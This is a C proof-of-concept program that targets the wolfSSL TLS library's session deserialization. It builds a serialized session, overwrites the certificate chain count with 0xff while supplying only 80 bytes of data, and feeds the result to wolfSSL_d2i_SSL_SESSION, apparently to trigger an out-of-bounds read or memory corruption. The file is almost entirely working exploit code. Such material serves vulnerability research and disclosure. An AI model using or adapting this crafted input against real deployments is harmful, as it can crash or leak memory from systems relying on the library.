#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <wolfssl/options.h>
#include <wolfssl/ssl.h>

#define POC_SECRET_LEN 48
#define POC_ID_LEN     32

static int build_mutated_session(unsigned char** out, long* outLen)
{
    WOLFSSL_SESSION* sess = NULL;
    unsigned char* sessDer = NULL;
    unsigned char* modData = NULL;
    unsigned char* pp = NULL;
    int sz;
    int idx;
    int sessionIDSz;
    int altIDLen;
    int chainOffset;
    int newLen;

    if (out == NULL || outLen == NULL)
        return -1;

    sess = wolfSSL_SESSION_new();
    if (sess == NULL) {
        fprintf(stderr, "[-] wolfSSL_SESSION_new failed\n");
        return -1;
    }

    sz = wolfSSL_i2d_SSL_SESSION(sess, NULL);
    fprintf(stderr, "[*] wolfSSL_i2d_SSL_SESSION size returned: %d\n", sz);
    if (sz <= 0) {
        wolfSSL_SESSION_free(sess);
        return -1;
    }

    sessDer = (unsigned char*)malloc((size_t)sz);
    if (sessDer == NULL) {
        wolfSSL_SESSION_free(sess);
        return -1;
    }

    pp = sessDer;
    sz = wolfSSL_i2d_SSL_SESSION(sess, &pp);
    fprintf(stderr, "[*] wolfSSL_i2d_SSL_SESSION write returned: %d\n", sz);

    wolfSSL_SESSION_free(sess);

    if (sz <= 0) {
        free(sessDer);
        return -1;
    }

    idx = 1 + 4 + 4;

    if (idx >= sz) {
        free(sessDer);
        return -1;
    }

    sessionIDSz = sessDer[idx++];
    fprintf(stderr, "[*] sessionIDSz: %d\n", sessionIDSz);

    idx += sessionIDSz;
    idx += POC_SECRET_LEN;
    idx += 1;

    if (idx >= sz) {
        free(sessDer);
        return -1;
    }

    altIDLen = sessDer[idx++];
    fprintf(stderr, "[*] altIDLen: %d\n", altIDLen);

    if (altIDLen == POC_ID_LEN)
        idx += POC_ID_LEN;

    if (idx < 0 || idx > sz) {
        free(sessDer);
        return -1;
    }

    chainOffset = idx;
    fprintf(stderr, "[*] chain.count offset: %d\n", chainOffset);

    newLen = chainOffset + 1 + 80;

    modData = (unsigned char*)malloc((size_t)newLen);
    if (modData == NULL) {
        free(sessDer);
        return -1;
    }

    memcpy(modData, sessDer, (size_t)chainOffset);
    modData[chainOffset] = 0xff;
    memset(modData + chainOffset + 1, 0x00,
           (size_t)(newLen - chainOffset - 1));

    free(sessDer);

    *out = modData;
    *outLen = (long)newLen;

    return 0;
}

int main(void)
{
#if defined(OPENSSL_EXTRA) && defined(HAVE_EXT_CACHE) && defined(SESSION_CERTS)
    unsigned char* data = NULL;
    const unsigned char* ptr = NULL;
    long dataLen = 0;
    WOLFSSL_SESSION* restored = NULL;
    int ret;

    fprintf(stderr, "[*] wolfSSL_Init\n");
    ret = wolfSSL_Init();
    fprintf(stderr, "[*] wolfSSL_Init returned: %d\n", ret);

    if (build_mutated_session(&data, &dataLen) != 0) {
        fprintf(stderr, "[-] failed to build mutated session\n");
        wolfSSL_Cleanup();
        return 2;
    }

    fprintf(stderr, "[*] mutated session length: %ld\n", dataLen);
    fprintf(stderr, "[*] calling wolfSSL_d2i_SSL_SESSION\n");

    ptr = data;
    restored = wolfSSL_d2i_SSL_SESSION(NULL, &ptr, dataLen);

    fprintf(stderr, "[*] wolfSSL_d2i_SSL_SESSION returned: %p\n",
            (void*)restored);

    if (restored != NULL)
        wolfSSL_SESSION_free(restored);

    free(data);
    wolfSSL_Cleanup();

    fprintf(stderr, "[*] cleanup done\n");
    return 0;
#else
    fprintf(stderr, "[-] required build macros not enabled\n");
    fprintf(stderr, "[-] need OPENSSL_EXTRA, HAVE_EXT_CACHE, SESSION_CERTS\n");
    return 77;
#endif
}
